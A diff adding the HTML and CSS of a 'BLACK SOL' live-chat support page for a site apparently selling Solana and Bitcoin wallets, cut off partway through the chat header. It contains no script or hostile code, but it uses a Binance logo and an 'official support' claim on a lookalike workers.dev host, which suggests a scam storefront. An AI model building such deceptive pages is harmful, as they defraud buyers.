@@ -1,0 +1,1283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>SOL · BTC Support</title>
+  <meta property="og:title" content="SOL · BTC Support">
+  <meta property="og:description" content="Official customer support center for BLACK SOL. Get help with orders, payments and wallet delivery — fast and secure.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://blacksol.quotex-norepily.workers.dev/support.html">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="BLACK SOL — Support Center">
+  <meta name="twitter:description" content="Official customer support center for BLACK SOL. Get help with orders, payments and delivery.">
+  <link rel="icon" type="image/png" href="https://cryptologos.cc/logos/binance-coin-bnb-logo.png">
+  <link rel="shortcut icon" href="https://cryptologos.cc/logos/binance-coin-bnb-logo.png">
+  <link rel="stylesheet" href="style.css">
+  <style>
+    /* ============================================================
+       BLACK SOL — Support Center (Dashboard layout)
+       Left sidebar navigation + full-height Live Chat panel.
+       Professional, WordPress-admin style information architecture.
+       ============================================================ */
+
+    :root {
+      --sb-bg: #0b0d12;
+      --sb-surface: #12151c;
+      --sb-surface-2: #171b23;
+      --sb-border: rgba(255,255,255,0.06);
+      --sb-border-soft: rgba(255,255,255,0.05);
+      --sb-text: #eef0f6;
+      --sb-text-soft: #9aa3b2;
+      --sb-muted: #5c6472;
+      --sb-faint: rgba(255,255,255,0.35);
+      --sb-brand: #9945FF;
+      --sb-green: #14F195;
+      --sb-btc: #F7931A;
+      --sb-radius: 12px;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body { height: 100%; }
+
+    body {
+      margin: 0;
+      height: 100dvh;
+      overflow: hidden;
+      background:
+        radial-gradient(1000px 460px at 80% -100px, rgba(153,69,255,0.10), transparent 65%),
+        var(--sb-bg);
+      color: var(--sb-text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+        Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    a { color: inherit; text-decoration: none; }
+
+    /* ===== App shell ===== */
+    .app {
+      display: flex;
+      height: 100dvh;
+    }
+
+    /* ============================================================
+       Sidebar
+       ============================================================ */
+    .sidebar {
+      width: 252px;
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      background: linear-gradient(180deg, var(--sb-surface), var(--sb-bg));
+      border-right: 1px solid var(--sb-border);
+    }
+
+    .sidebar__brand {
+      display: flex;
+      align-items: center;
+      gap: 11px;
+      padding: 22px 20px 18px;
+      border-bottom: 1px solid var(--sb-border-soft);
+    }
+    .sidebar__brand .logo-text {
+      font-size: 15px;
+      font-weight: 800;
+      letter-spacing: 0.8px;
+      white-space: nowrap;
+      background: linear-gradient(90deg, var(--sb-brand), var(--sb-btc));
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+      line-height: 1;
+    }
+    .sidebar__brand .logo-tag {
+      font-size: 10px;
+      color: var(--sb-muted);
+      letter-spacing: 0.4px;
+      margin-top: 3px;
+      text-transform: uppercase;
+    }
+
+    .sidebar__label {
+      padding: 18px 22px 8px;
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1.2px;
+      color: var(--sb-muted);
+    }
+
+    .sidebar__nav {
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+      padding: 0 12px;
+    }
+    .sidebar__item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 12px;
+      border-radius: 9px;
+      font-size: 13.5px;
+      font-weight: 500;
+      color: var(--sb-text-soft);
+      transition: background 0.16s, color 0.16s;
+    }
+    .sidebar__item svg { width: 17px; height: 17px; flex-shrink: 0; color: var(--sb-muted); transition: color 0.16s; }
+    .sidebar__item:hover { background: rgba(255,255,255,0.04); color: #fff; }
+    .sidebar__item:hover svg { color: var(--sb-text-soft); }
+    .sidebar__item.active {
+      background: linear-gradient(90deg, rgba(153,69,255,0.16), rgba(153,69,255,0.05));
+      color: #fff;
+      border: 1px solid rgba(153,69,255,0.22);
+    }
+    .sidebar__item.active svg { color: var(--sb-brand); }
+    .sidebar__item .item-arrow { margin-left: auto; opacity: 0; transition: opacity 0.16s; }
+    .sidebar__item.active .item-arrow { opacity: 1; color: var(--sb-brand); }
+
+    .sidebar__badge {
+      margin-left: auto;
+      font-size: 9.5px;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: 999px;
+      background: rgba(20,241,149,0.1);
+      color: var(--sb-green);
+      border: 1px solid rgba(20,241,149,0.18);
+    }
+
+    .sidebar__foot {
+      margin-top: auto;
+      padding: 14px 16px 18px;
+      border-top: 1px solid var(--sb-border-soft);
+    }
+    .sidebar__online {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 11px 13px;
+      border-radius: 11px;
+      background: rgba(255,255,255,0.03);
+      border: 1px solid var(--sb-border-soft);
+    }
+    .sidebar__online .pulse {
+      width: 9px; height: 9px; border-radius: 50%;
+      background: var(--sb-green);
+      box-shadow: 0 0 0 0 rgba(20,241,149,0.5);
+      animation: sbPulse 2.2s infinite;
+    }
+    @keyframes sbPulse {
+      0%   { box-shadow: 0 0 0 0 rgba(20,241,149,0.5); }
+      70%  { box-shadow: 0 0 0 7px rgba(20,241,149,0); }
+      100% { box-shadow: 0 0 0 0 rgba(20,241,149,0); }
+    }
+    .sidebar__online b { display: block; font-size: 12.5px; color: #fff; }
+    .sidebar__online span { font-size: 10.5px; color: var(--sb-text-soft); }
+
+    /* ============================================================
+       Main area
+       ============================================================ */
+    .main {
+      flex: 1;
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main__bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 16px 26px;
+      border-bottom: 1px solid var(--sb-border-soft);
+      background: rgba(255,255,255,0.012);
+      flex-shrink: 0;
+    }
+    .main__bar-title {
+      margin: 0;
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+    }
+    .main__bar-sub {
+      margin: 0;
+      font-size: 12px;
+      color: var(--sb-text-soft);
+    }
+    .main__bar-right {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .ticket-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 7px 13px;
+      border-radius: 999px;
+      border: 1px solid var(--sb-border);
+      background: rgba(255,255,255,0.02);
+      font-size: 11px;
+      color: var(--sb-text-soft);
+    }
+    .ticket-chip code {
+      font-family: ui-monospace, "SFMono-Regular", Consolas, monospace;
+      color: rgba(255,255,255,0.45);
+      font-weight: 600;
+      user-select: all;
+    }
+    .main__close {
+      width: 36px; height: 36px;
+      border-radius: 9px;
+      border: 1px solid var(--sb-border);
+      background: rgba(255,255,255,0.02);
+      color: var(--sb-text-soft);
+      display: flex; align-items: center; justify-content: center;
+      transition: all 0.18s;
+    }
+    .main__close:hover { color: #fff; border-color: rgba(153,69,255,0.3); background: rgba(153,69,255,0.08); }
+    .main__close svg { width: 15px; height: 15px; }
+
+    /* content */
+    .main__content {
+      flex: 1;
+      min-height: 0;
+      padding: 22px 26px 26px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .content__head {
+      margin-bottom: 16px;
+      flex-shrink: 0;
+    }
+    .content__crumbs {
+      font-size: 11.5px;
+      color: var(--sb-muted);
+      margin-bottom: 6px;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+    .content__crumbs a { color: var(--sb-text-soft); }
+    .content__crumbs a:hover { color: #fff; }
+    .content__crumbs .sep { color: var(--sb-faint); }
+    .content__title {
+      margin: 0 0 6px;
+      font-size: clamp(22px, 3vw, 30px);
+      font-weight: 800;
+      letter-spacing: -0.02em;
+      background: linear-gradient(180deg, #ffffff, #b9c2d4);
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .content__lede {
+      margin: 0;
+      font-size: 13.5px;
+      color: var(--sb-text-soft);
+      max-width: 560px;
+    }
+
+    /* ============================================================
+       Live Chat panel (fills remaining space)
+       ============================================================ */
+    .wp-chat {
+      flex: 1;
+      min-height: 0;
+      display: flex;
+      flex-direction: column;
+      background: linear-gradient(180deg, var(--sb-surface), var(--sb-surface-2));
+      border: 1px solid var(--sb-border);
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 20px 60px -30px rgba(0,0,0,0.8);
+    }
+
+    .chat-header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 16px 22px;
+      border-bottom: 1px solid var(--sb-border-soft);
+      background: rgba(255,255,255,0.015);
+      flex-shrink: 0;
+    }
+    .chat-avatar {
+      width: 46px; height: 46px; border-radius: 50%;
+      background: linear-gradient(135deg, var(--sb-brand), var(--sb-btc));
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; position: relative;
+    }
+    .chat-avatar svg { width: 20px; height: 20px; color: #fff; }
+    .chat-avatar .online-dot {
+      position: absolute; bottom: 0; right: 0;
+      width: 12px; height: 12px; border-radius: 50%;
+      background: var(--sb-green); border: 3px solid var(--sb-surface);
+    }
+    .chat-agent-info { flex: 1; min-width: 0; }
+    .chat-agent-name {
+      font-size: 15px; font-weight: 700; color: #fff;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .chat-agent-badge {
+      font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px;
+      padding: 3px 10px; border-radius: 50px;
+      background: rgba(20,241,149,0.08); color: var(--sb-green);
+      border: 1px solid rgba(20,241,149,0.18);
+    }
+    .chat-agent-title { font-size: 11px; color: var(--sb-text-soft); margin-top: 2px; }
+    .chat-agent-status {
+      font-size: 12.5px; color: var(--sb-text-soft);
+      display: flex; align-items: center; gap: 7px; margin-top: 4px;
+    }
+    .chat-agent-status .status-dot {
+      width: 6px; height: 6px; border-radius: 50%;
+      background: var(--sb-green);
+      box-shadow: 0 0 8px rgba(20,241,149,0.7);
+    }
+
+    .chat-messages {
+      flex: 1; min-height: 0; overflow-y: auto;
+      padding: 22px;
+      display: flex; flex-direction: column; gap: 12px;
+      scroll-behavior: smooth;
+    }
+    .chat-messages::-webkit-scrollbar { width: 7px; }
+    .chat-messages::-webkit-scrollbar-track { background: transparent; }
+    .chat-messages::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.08); border-radius: 4px; }
+
+    .msg { display: flex; gap: 12px; max-width: 78%; animation: sbMsgIn 0.35s ease; }
+    @keyframes sbMsgIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .msg.agent, .msg.admin { align-self: flex-start; }
+    .msg.user { align-self: flex-end; flex-direction: row-reverse; }
+    .msg-avatar {
+      width: 34px; height: 34px; border-radius: 50%; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 700;
+    }
+    .msg.agent .msg-avatar { background: linear-gradient(135deg, var(--sb-brand), var(--sb-btc)); color: #fff; }
+    .msg.admin .msg-avatar { background: var(--sb-green); color: #0b0f14; }
+    .msg.user .msg-avatar { background: rgba(255,255,255,0.06); color: var(--sb-text-soft); }
+    .msg-body { display: flex; flex-direction: column; gap: 3px; }
+    .msg-bubble {
+      padding: 12px 16px; border-radius: 14px;
+      font-size: 14px; line-height: 1.7; word-wrap: break-word;
+    }
+    .msg.agent .msg-bubble, .msg.admin .msg-bubble {
+      background: rgba(255,255,255,0.035);
+      border: 1px solid var(--sb-border-soft);
+      border-bottom-left-radius: 4px;
+      color: var(--sb-text);
+    }
+    .msg.agent .msg-bubble strong, .msg.admin .msg-bubble strong { color: #fff; }
+    .msg.user .msg-bubble {
+      background: linear-gradient(135deg, rgba(153,69,255,0.22), rgba(153,69,255,0.08));
+      border: 1px solid rgba(153,69,255,0.18);
+      border-bottom-right-radius: 4px; color: #fff;
+    }
+    .msg-time { font-size: 10px; color: rgba(255,255,255,0.22); padding: 0 4px; }
+    .msg.agent .msg-time, .msg.admin .msg-time { align-self: flex-start; }
+    .msg.user .msg-time { align-self: flex-end; }
+    .msg.system { align-self: center; max-width: 100%; }
+    .msg.system .msg-bubble {
+      background: rgba(255,255,255,0.015); border: 1px solid var(--sb-border-soft);
+      border-radius: 999px; padding: 6px 16px; font-size: 11px; color: var(--sb-faint); text-align: center;
+    }
+
+    .typing-indicator { display: none; align-self: flex-start; gap: 12px; animation: sbMsgIn 0.3s ease; }
+    .typing-indicator.show { display: flex; }
+    .typing-dots {
+      display: flex; align-items: center; gap: 5px;
+      padding: 15px 18px; background: rgba(255,255,255,0.035);
+      border: 1px solid var(--sb-border-soft); border-radius: 16px; border-bottom-left-radius: 4px;
+    }
+    .typing-dot { width: 7px; height: 7px; border-radius: 50%; background: rgba(255,255,255,0.2); animation: sbTyping 1.4s ease-in-out infinite; }
+    .typing-dot:nth-child(2) { animation-delay: 0.2s; }
+    .typing-dot:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes sbTyping { 0%,80%,100% { transform: translateY(0); background: rgba(255,255,255,0.2); } 40% { transform: translateY(-8px); background: var(--sb-brand); } }
+
+    .chat-input-wrap {
+      display: flex; align-items: center; gap: 10px;
+      padding: 14px 22px 18px;
+      border-top: 1px solid var(--sb-border-soft);
+      background: rgba(255,255,255,0.015);
+      flex-shrink: 0;
+    }
+    .chat-input {
+      flex: 1;
+      padding: 13px 16px;
+      background: rgba(255,255,255,0.04);
+      border: 1px solid var(--sb-border);
+      border-radius: 12px;
+      color: #fff; font-size: 14px;
+      font-family: inherit; outline: none; transition: border-color 0.2s, background 0.2s;
+    }
+    .chat-input:focus { border-color: rgba(153,69,255,0.45); background: rgba(153,69,255,0.03); }
+    .chat-input::placeholder { color: var(--sb-faint); }
+    .chat-send-btn {
+      width: 46px; height: 46px; border-radius: 12px;
+      background: linear-gradient(135deg, var(--sb-brand), var(--sb-btc));
+      border: none; color: #fff; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; transition: transform 0.18s, box-shadow 0.18s;
+    }
+    .chat-send-btn:hover { transform: scale(1.05); box-shadow: 0 8px 26px -10px rgba(153,69,255,0.8); }
+    .chat-send-btn:active { transform: scale(0.95); }
+    .chat-send-btn svg { width: 18px; height: 18px; }
+
+    /* ===== Connecting status ===== */
+    .msg.connect-msg { align-self: flex-start; max-width: 88%; animation: sbMsgIn 0.5s ease; }
+    .connect-bubble {
+      background: rgba(153,69,255,0.05);
+      border: 1px solid rgba(153,69,255,0.16);
+      border-radius: 16px;
+      padding: 16px 18px;
+      min-width: 290px;
+      transition: all 0.4s ease;
+    }
+    .connect-bubble.resolved { border-color: rgba(20,241,149,0.2); background: rgba(20,241,149,0.03); }
+    .connect-row { display: flex; align-items: center; gap: 13px; }
+    .connect-spinner { width: 28px; height: 28px; flex-shrink: 0; position: relative; }
+    .connect-spinner svg { width: 28px; height: 28px; animation: sbSpin 2s linear infinite; }
+    @keyframes sbSpin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .connect-spinner .inner-dot {
+      position: absolute; top: 50%; left: 50%;
+      width: 6px; height: 6px; margin: -3px 0 0 -3px;
+      border-radius: 50%; background: var(--sb-brand);
+      animation: sbDot 1.2s ease-in-out infinite;
+    }
+    @keyframes sbDot { 0%,100% { transform: scale(1); opacity: 0.6; } 50% { transform: scale(1.6); opacity: 1; } }
+    .connect-spinner .arc-path { fill: none; stroke: var(--sb-brand); stroke-width: 2.5; stroke-linecap: round; stroke-dasharray: 60 200; animation: sbArc 1.6s ease-in-out infinite; }
+    @keyframes sbArc { 0% { stroke-dasharray: 60 200; transform: rotate(0deg); } 50% { stroke-dasharray: 140 200; transform: rotate(180deg); } 100% { stroke-dasharray: 60 200; transform: rotate(360deg); } }
+    .connect-text { flex: 1; min-width: 0; }
+    .connect-text-main { font-size: 13px; font-weight: 600; color: #fff; }
+    .connect-text-sub { font-size: 11.5px; color: var(--sb-text-soft); margin-top: 2px; }
+    .connect-timer-mini { font-size: 12px; font-weight: 700; font-variant-numeric: tabular-nums; color: var(--sb-text-soft); flex-shrink: 0; letter-spacing: 0.5px; }
+    .connect-bar-wrap { margin-top: 12px; height: 3px; background: rgba(255,255,255,0.05); border-radius: 3px; overflow: hidden; }
+    .connect-bar-fill { height: 100%; width: 0%; border-radius: 3px; background: linear-gradient(90deg, var(--sb-brand), var(--sb-green)); transition: width 0.4s ease; }
+    .connect-bar-fill.done { background: var(--sb-green); }
+    .connect-stage-label { display: flex; flex-direction: column; gap: 7px; margin-top: 10px; }
+    .connect-stages { display: flex; gap: 5px; }
+    .connect-stage-seg { flex: 1; height: 4px; border-radius: 4px; background: rgba(255,255,255,0.06); overflow: hidden; position: relative; }
+    .connect-stage-seg::after { content: ''; position: absolute; inset: 0; border-radius: inherit; background: linear-gradient(90deg, var(--sb-brand), var(--sb-btc)); transform: scaleX(0); transform-origin: left; transition: transform 0.5s ease; }
+    .connect-stage-seg.done::after, .connect-stage-seg.active::after { transform: scaleX(1); }
+    .connect-stage-seg.active::after { animation: sbStagePulse 1s ease-in-out infinite; }
+    @keyframes sbStagePulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
+    .connect-stage-meta { display: flex; align-items: center; justify-content: space-between; }
+    .connect-stage-pill { display: inline-flex; align-items: center; gap: 6px; font-size: 10px; font-weight: 700; letter-spacing: 0.4px; color: var(--sb-text); background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.09); border-radius: 99px; padding: 3px 9px; font-variant-numeric: tabular-nums; }
+    .connect-stage-pill .p-dot { width: 5px; height: 5px; border-radius: 50%; background: linear-gradient(135deg, var(--sb-brand), var(--sb-btc)); animation: sbSDot 1s ease-in-out infinite; }
+    @keyframes sbSDot { 0%,100% { opacity: 0.3; } 50% { opacity: 1; } }
+    .connect-checkmark { display: none; align-items: center; gap: 6px; margin-top: 8px; font-size: 11px; font-weight: 600; color: var(--sb-green); }
+    .connect-checkmark.show { display: flex; }
+    .connect-checkmark svg { width: 14px; height: 14px; stroke: var(--sb-green); animation: sbCheck 0.4s cubic-bezier(0.16,1,0.3,1); }
+    @keyframes sbCheck { 0% { transform: scale(0) rotate(-20deg); opacity: 0; } 100% { transform: scale(1) rotate(0); opacity: 1; } }
+
+    /* security note strip inside chat footer area */
+    .chat-security {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 10px 22px 14px;
+      font-size: 11px;
+      color: var(--sb-muted);
+      border-top: 1px solid var(--sb-border-soft);
+      flex-shrink: 0;
+    }
+    .chat-security svg { width: 13px; height: 13px; color: var(--sb-brand); flex-shrink: 0; }
+    .chat-security strong { color: var(--sb-text-soft); }
+
+    /* ===== Mobile tab strip (phones only) ===== */
+    .mobile-nav { display: none; }
+
+    /* ===== Responsive ===== */
+    @media (max-width: 860px) {
+      .sidebar { width: 72px; }
+      .sidebar__brand { justify-content: center; padding: 18px 8px 14px; text-align: center; }
+      .sidebar__brand .logo-text { display: block; font-size: 11.5px; line-height: 1.35; letter-spacing: 0; white-space: normal; width: 100%; }
+      .sidebar__brand .logo-tag { display: none; }
+      .sidebar__label { display: none; }
+      .sidebar__nav { padding: 0 8px; }
+      .sidebar__item { justify-content: center; padding: 11px; }
+      .sidebar__item .item-txt { display: none; }
+      .sidebar__item .item-arrow { display: none; }
+      .sidebar__badge { display: none; }
+      .sidebar__online { justify-content: center; padding: 10px; }
+      .sidebar__online .side-txt { display: none; }
+    }
+
+    /* ===== Phones: polished app layout ===== */
+    @media (max-width: 560px) {
+      html, body { height: 100%; }
+      .app {
+        flex-direction: column;
+        height: 100dvh;
+      }
+
+      /* hide desktop sidebar on phones */
+      .sidebar { display: none; }
+
+      .main {
+        flex: 1;
+        min-height: 0;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* top bar */
+      .main__bar {
+        padding: calc(10px + env(safe-area-inset-top)) 16px 12px;
+        gap: 10px;
+      }
+      .main__bar-title { font-size: 17px; }
+      .main__bar-sub { font-size: 11.5px; }
+      .ticket-chip { display: none; }
+      .main__close { width: 38px; height: 38px; }
+
+      /* tab strip */
+      .mobile-nav {
+        display: flex;
+        flex-shrink: 0;
+        gap: 4px;
+        padding: 8px 12px 10px;
+        border-bottom: 1px solid var(--sb-border-soft);
+        background: rgba(255,255,255,0.012);
+        overflow-x: auto;
+        scrollbar-width: none;
+      }
+      .mobile-nav::-webkit-scrollbar { display: none; }
+      .mobile-nav a {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        flex-shrink: 0;
+        padding: 8px 13px;
+        border-radius: 999px;
+        font-size: 12px;
+        font-weight: 600;
+        color: var(--sb-text-soft);
+        border: 1px solid transparent;
+        transition: all 0.18s;
+      }
+      .mobile-nav a svg { width: 14px; height: 14px; }
+      .mobile-nav a:active { transform: scale(0.96); }
+      .mobile-nav a.active {
+        color: #fff;
+        background: linear-gradient(90deg, rgba(153,69,255,0.22), rgba(153,69,255,0.08));
+        border-color: rgba(153,69,255,0.35);
+      }
+      .mobile-nav a.active svg { color: var(--sb-brand); }
+
+      /* content: chat fills everything below */
+      .main__content {
+        flex: 1;
+        min-height: 0;
+        padding: 0;
+      }
+
+      /* chat panel edge-to-edge */
+      .wp-chat {
+        border: none;
+        border-radius: 0;
+        box-shadow: none;
+      }
+
+      .chat-header { padding: 14px 16px; gap: 12px; }
+      .chat-avatar { width: 42px; height: 42px; }
+      .chat-agent-name { font-size: 14px; }
+      .chat-agent-title { font-size: 10.5px; }
+      .chat-agent-status { font-size: 12px; }
+
+      .chat-messages { padding: 16px 14px; gap: 11px; }
+      .msg { max-width: 90%; }
+      .msg-bubble { font-size: 14px; padding: 12px 15px; }
+      .connect-bubble { min-width: 0; }
+
+      .chat-input-wrap {
+        padding: 12px 14px calc(12px + env(safe-area-inset-bottom));
+        gap: 8px;
+      }
+      .chat-input { padding: 12px 15px; font-size: 15px; }
+      .chat-send-btn { width: 48px; height: 48px; }
+
+      .chat-security {
+        padding: 9px 16px calc(9px + env(safe-area-inset-bottom));
+        font-size: 10.5px;
+        line-height: 1.55;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app">
+
+    <!-- ===== Sidebar ===== -->
+    <aside class="sidebar">
+      <a href="Home.html" class="sidebar__brand">
+        <div>
+          <div class="logo-text">SOL · BTC Support</div>
+          <div class="logo-tag">Multi-Asset Support Center</div>
+        </div>
+      </a>
+
+      <div class="sidebar__label">Navigation</div>
+      <nav class="sidebar__nav">
+        <a href="Home.html" class="sidebar__item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+          <span class="item-txt">Store</span>
+        </a>
+        <a href="Home.html#products" class="sidebar__item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"/><path d="m3.3 7 8.7 5 8.7-5"/><path d="M12 22V12"/></svg>
+          <span class="item-txt">Solana Wallets</span>
+          <span class="sidebar__badge">Live</span>
+        </a>
+        <a href="btc.html" class="sidebar__item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" style="color:#F7931A;"><circle cx="12" cy="12" r="10"/><path d="M15.2 9.2c.4-2.6-1.5-3.9-4.1-4.9l-.9 3.5c-.6-.2-1.2-.4-1.8-.6l.9-3.5-2.1-.5-1 3.8c-.5-.1-1-.3-1.5-.5L3.5 5.6l-.6 2.2s1.5.4 1.5.4c.9.2 1.1.8 1 .1.4-1.6 1.2-1.1 1.2-1.1l.8 3 2.1.5-1 3.8 2.1.5.9-3.7c.7.2 1.3.3 1.9.5l-.9 3.6 2.1.5 1-4c2.6-.6 4.4-1.5 4.9-4-.4-2.9-1.2-4.1-3.4-4.9z"/></svg>
+          <span class="item-txt">Bitcoin Wallets</span>
+        </a>
+        <a href="support.html" class="sidebar__item active">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M4 13.5 2.8 9.6a1 1 0 0 1 .5-1.2l1.2-.5a1 1 0 0 1 .8 0l1.3.5"/><path d="M20 13.5l1.2-3.9a1 1 0 0 0-.5-1.2l-1.2-.5a1 1 0 0 0-.8 0l-1.3.5"/><path d="M16.5 12.5a1.5 1.5 0 0 1 1.5 1.5c0 .7-.5 1.3-1.2 1.4"/><path d="M7.5 12.5A1.5 1.5 0 0 0 6 14c0 .7.5 1.3 1.2 1.4"/><path d="M16.5 15.8a6 6 0 0 1-9 0"/></svg>
+          <span class="item-txt">Live Support</span>
+          <svg class="item-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:14px;height:14px;"><path d="m9 18 6-6-6-6"/></svg>
+        </a>
+        <a href="legal.html" class="sidebar__item">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          <span class="item-txt">Account</span>
+        </a>
+      </nav>
+
+      <div class="sidebar__foot">
+        <div class="sidebar__online">
+          <span class="pulse"></span>
+          <span class="side-txt">
+            <b>Support Online</b>
+            <span>Avg. reply 2–5 min · 24/7</span>
+          </span>
+        </div>
+      </div>
+    </aside>
+
+    <!-- ===== Main ===== -->
+    <main class="main">
+      <div class="main__bar">
+        <div>
+          <h1 class="main__bar-title">Live Chat</h1>
+          <p class="main__bar-sub">Solana &amp; Bitcoin Support — Priority Desk</p>
+        </div>
+        <div class="main__bar-right">
+          <span class="ticket-chip">
+            Ticket ID: <span id="userIdDisplay"><code style="color:rgba(255,255,255,0.45);font-weight:600;user-select:all;"></code></span>
+          </span>
+          <a href="Home.html" class="main__close" title="Close &amp; return to store">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M18 6 6 18M6 6l12 12"/></svg>
+          </a>
+        </div>
+      </div>
+
+      <!-- Mobile tab strip (phone only) -->
+      <nav class="mobile-nav">
+        <a href="Home.html">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+          <span>Store</span>
+        </a>
+        <a href="Home.html#products">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"/><path d="m3.3 7 8.7 5 8.7-5"/><path d="M12 22V12"/></svg>
+          <span>Solana</span>
+        </a>
+        <a href="btc.html">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" style="color:#F7931A;"><circle cx="12" cy="12" r="10"/><path d="M15.2 9.2c.4-2.6-1.5-3.9-4.1-4.9l-.9 3.5c-.6-.2-1.2-.4-1.8-.6l.9-3.5-2.1-.5-1 3.8c-.5-.1-1-.3-1.5-.5L3.5 5.6l-.6 2.2s1.5.4 1.5.4c.9.2 1.1.8 1 .1.4-1.6 1.2-1.1 1.2-1.1l.8 3 2.1.5-1 3.8 2.1.5.9-3.7c.7.2 1.3.3 1.9.5l-.9 3.6 2.1.5 1-4c2.6-.6 4.4-1.5 4.9-4-.4-2.9-1.2-4.1-3.4-4.9z"/></svg>
+          <span>Bitcoin</span>
+        </a>
+        <a href="support.html" class="active">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M4 13.5 2.8 9.6a1 1 0 0 1 .5-1.2l1.2-.5a1 1 0 0 1 .8 0l1.3.5"/><path d="M20 13.5l1.2-3.9a1 1 0 0 0-.5-1.2l-1.2-.5a1 1 0 0 0-.8 0l-1.3.5"/><path d="M16.5 12.5a1.5 1.5 0 0 1 1.5 1.5c0 .7-.5 1.3-1.2 1.4"/><path d="M7.5 12.5A1.5 1.5 0 0 0 6 14c0 .7.5 1.3 1.2 1.4"/><path d="M16.5 15.8a6 6 0 0 1-9 0"/></svg>
+          <span>Support</span>
+        </a>
+        <a href="legal.html">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          <span>Account</span>
+        </a>
+      </nav>
+
+      <div class="main__content">
+        <!-- ===== Live chat panel ===== -->
+        <div class="wp-chat">
+          <div class="chat-header">
+            <div class="chat-avatar">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
